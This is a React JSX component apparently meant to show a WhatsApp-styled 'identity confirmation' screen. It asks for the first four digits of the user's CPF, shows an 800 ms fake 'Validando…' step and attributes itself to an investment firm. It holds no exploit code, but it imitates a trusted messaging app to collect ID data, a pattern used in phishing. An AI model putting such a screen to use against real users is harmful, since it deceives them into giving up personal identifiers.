// identity.jsx — Confirmação de identidade (4 primeiros dígitos do CPF)

const { useState: useStateID, useEffect: useEffectID, useRef: useRefID } = React;

function IdentityModal({ open, onSubmit, onClose }) {
  const [code, setCode] = useStateID('');
  const [submitting, setSubmitting] = useStateID(false);
  const [shake, setShake] = useStateID(0);
  const inputRef = useRefID(null);

  useEffectID(() => {
    if (open) {
      setCode('');
      setSubmitting(false);
      const t = setTimeout(() => inputRef.current && inputRef.current.focus(), 220);
      return () => clearTimeout(t);
    }
  }, [open]);

  if (!open) return null;

  const valid = code.length === 4;

  const handleSubmit = () => {
    if (!valid || submitting) return;
    setSubmitting(true);
    setTimeout(() => onSubmit && onSubmit({ code }), 800);
  };

  const onChangeCode = (v) => {
    const d = (v || '').replace(/\D/g, '').slice(0, 4);
    setCode(d);
  };

  return (
    <div style={{
      position: 'absolute', inset: 0, zIndex: 110,
      display: 'flex',
      animation: 'fadeIn 180ms ease both',
      background: '#fff',
      flexDirection: 'column',
      fontFamily: '-apple-system, "Segoe UI", system-ui, sans-serif',
    }}>
      {/* Header — WhatsApp-style overlay window */}
      <div style={{
        height: 52,
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
        padding: '0 16px',
        borderBottom: '0.5px solid rgba(0,0,0,.08)',
        flexShrink: 0,
      }}>
        <div style={{
          fontSize: 16, fontWeight: 500, color: '#111B21',
          letterSpacing: -.1,
        }}>Confirmação de identidade</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          <button style={iconBtn}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="5" r="1.6" fill="#54656F"/>
              <circle cx="12" cy="12" r="1.6" fill="#54656F"/>
              <circle cx="12" cy="19" r="1.6" fill="#54656F"/>
            </svg>
          </button>
          <button onClick={onClose} style={iconBtn}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
              <path d="M6 6l12 12M18 6L6 18" stroke="#54656F" strokeWidth="1.8" strokeLinecap="round"/>
            </svg>
          </button>
        </div>
      </div>

      {/* progress bar */}
      <div style={{
        height: 3, background: 'rgba(0,0,0,.06)',
        flexShrink: 0,
      }}>
        <div style={{
          height: '100%', width: '50%',
          background: '#00A884',
          transition: 'width 320ms ease',
        }} />
      </div>

      {/* hero shield */}
      <div style={{
        position: 'relative',
        background: '#0E1418',
        height: 150,
        flexShrink: 0,
        overflow: 'hidden',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
      }}>
        {/* faint world map */}
        <svg width="100%" height="100%" viewBox="0 0 400 150" preserveAspectRatio="xMidYMid slice"
             style={{ position: 'absolute', inset: 0, opacity: .14 }}>
          <defs>
            <pattern id="dots" x="0" y="0" width="6" height="6" patternUnits="userSpaceOnUse">
              <circle cx="1" cy="1" r="0.7" fill="#fff"/>
            </pattern>
            <mask id="mapmask">
              <rect width="400" height="150" fill="url(#dots)"/>
            </mask>
          </defs>
          {/* a stylized world silhouette via overlapping ellipses */}
          <g fill="#fff" mask="url(#mapmask)">
            <ellipse cx="80" cy="70" rx="55" ry="32"/>
            <ellipse cx="180" cy="60" rx="40" ry="24"/>
            <ellipse cx="240" cy="80" rx="50" ry="28"/>
            <ellipse cx="320" cy="65" rx="45" ry="26"/>
            <ellipse cx="120" cy="105" rx="30" ry="14"/>
            <ellipse cx="270" cy="115" rx="35" ry="16"/>
          </g>
        </svg>
        {/* shield with check */}
        <svg width="86" height="86" viewBox="0 0 86 86" fill="none" style={{ position: 'relative' }}>
          <path d="M43 6L11 18v22c0 18 14 36 32 40 18-4 32-22 32-40V18L43 6z"
                stroke="#fff" strokeWidth="2.2" strokeLinejoin="round" fill="none"/>
          <path d="M28 44 L39 55 L60 32" stroke="#fff" strokeWidth="3.4"
                strokeLinecap="round" strokeLinejoin="round" fill="none"/>
        </svg>
      </div>

      {/* body */}
      <div style={{
        padding: '20px 18px 0',
        flex: 1, overflowY: 'auto',
      }}>
        <p style={{
          fontSize: 14.5, color: '#111B21', lineHeight: 1.45,
          margin: '0 0 16px', fontWeight: 400,
        }}>
          Precisamos confirmar sua identidade. Digite os 4 primeiros dígitos do CPF cadastrado.
        </p>

        <div key={shake} style={{
          animation: shake ? 'shake 320ms ease' : 'none',
        }}>
          <input
            ref={inputRef}
            type="text"
            inputMode="numeric"
            value={code}
            onChange={(e) => onChangeCode(e.target.value)}
            onKeyDown={(e) => { if (e.key === 'Enter') handleSubmit(); }}
            placeholder="4 primeiros dígitos do CPF"
            style={{
              width: '100%',
              padding: '12px 14px',
              fontFamily: '-apple-system, system-ui',
              fontSize: 14.5,
              color: '#111B21',
              background: '#fff',
              border: '1px solid rgba(0,0,0,.18)',
              borderRadius: 6,
              outline: 'none',
              boxSizing: 'border-box',
              letterSpacing: code ? '.4em' : 'normal',
              transition: 'border-color 160ms ease',
            }}
            onFocus={(e) => (e.target.style.borderColor = '#00A884')}
            onBlur={(e) => (e.target.style.borderColor = 'rgba(0,0,0,.18)')}
          />
        </div>
      </div>

      {/* footer */}
      <div style={{
        padding: '14px 18px 16px',
        flexShrink: 0,
        background: '#fff',
        borderTop: '0px',
      }}>
        <button
          onClick={handleSubmit}
          disabled={!valid || submitting}
          style={{
            width: '100%',
            padding: '13px 18px',
            background: 'transparent',
            color: valid ? '#00A884' : 'rgba(0,0,0,.28)',
            border: 'none',
            borderRadius: 8,
            fontFamily: '-apple-system, system-ui',
            fontSize: 15,
            fontWeight: 500,
            letterSpacing: -.01,
            cursor: valid && !submitting ? 'pointer' : 'not-allowed',
            transition: 'color 160ms ease, background 160ms ease',
            display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
          }}
        >
          {submitting ? (
            <>
              <span style={{
                width: 14, height: 14, border: '2px solid rgba(0,168,132,.3)',
                borderTopColor: '#00A884', borderRadius: '50%',
                animation: 'spin 700ms linear infinite',
              }} />
              Validando…
            </>
          ) : (
            <>Confirmar</>
          )}
        </button>
        <div style={{
          marginTop: 10,
          display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6,
          fontSize: 11, color: '#54656F',
        }}>
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
            <circle cx="12" cy="12" r="10" stroke="#54656F" strokeWidth="1.6"/>
            <path d="M12 8v5M12 16v.5" stroke="#54656F" strokeWidth="1.6" strokeLinecap="round"/>
          </svg>
          <span>Gerenciada por Anova Investimentos.</span>
          <span style={{ color: '#00A884', fontWeight: 500 }}>Saiba mais</span>
        </div>
      </div>
    </div>
  );
}

const iconBtn = {
  appearance: 'none', border: 'none', background: 'transparent',
  width: 32, height: 32, borderRadius: '50%',
  display: 'flex', alignItems: 'center', justifyContent: 'center',
  cursor: 'pointer',
};

if (typeof document !== 'undefined' && !document.getElementById('identity-keyframes')) {
  const s = document.createElement('style');
  s.id = 'identity-keyframes';
  s.textContent = `
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      20% { transform: translateX(-6px); }
      40% { transform: translateX(6px); }
      60% { transform: translateX(-4px); }
      80% { transform: translateX(4px); }
    }
  `;
  document.head.appendChild(s);
}

Object.assign(window, { IdentityModal });
